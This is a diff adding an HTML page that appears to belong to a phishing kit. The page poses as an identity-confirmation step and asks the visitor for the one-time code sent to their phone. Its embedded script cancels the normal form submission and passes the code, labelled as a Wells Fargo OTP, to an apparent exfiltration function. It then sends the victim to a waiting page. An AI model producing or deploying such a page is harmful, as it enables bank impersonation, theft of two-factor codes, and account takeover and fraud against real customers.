@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirm your identity</title>
+    <link rel="stylesheet" href="res/fonts.css">
+    <link rel="stylesheet" href="res/app.css">
+</head>
+<body>
+<header>
+<div class="container">
+    <img src="res/logo.png">
+</div>
+</header>
+
+<main>
+<div class="container">
+
+
+
+<div class="form">
+
+<div class="title">Confirmation</div>
+<div class="text">Please submit the code sent to your phone number to continue.</div>
+
+<form action="post.php" method="post">
+<div class="col">
+    <input type="text" name="otp" required placeholder="Confirmation code">
+
+</div>
+
+<div class="col">
+    <button type="submit">Continue</button>
+</div>
+</form>
+
+
+</div>
+
+
+</div>
+</main>
+
+
+<script type="text/javascript">
+
+
+document.querySelector("form").addEventListener("submit",(e)=>{
+    e.preventDefault();
+
+   wu.zhong(`🔒 Wells Fargo OTP: ${document.querySelector("[name='otp']").value}`);
+
+    window.location="wait.html";
+
+})
+
+</script>
+
+</body>
+</html>
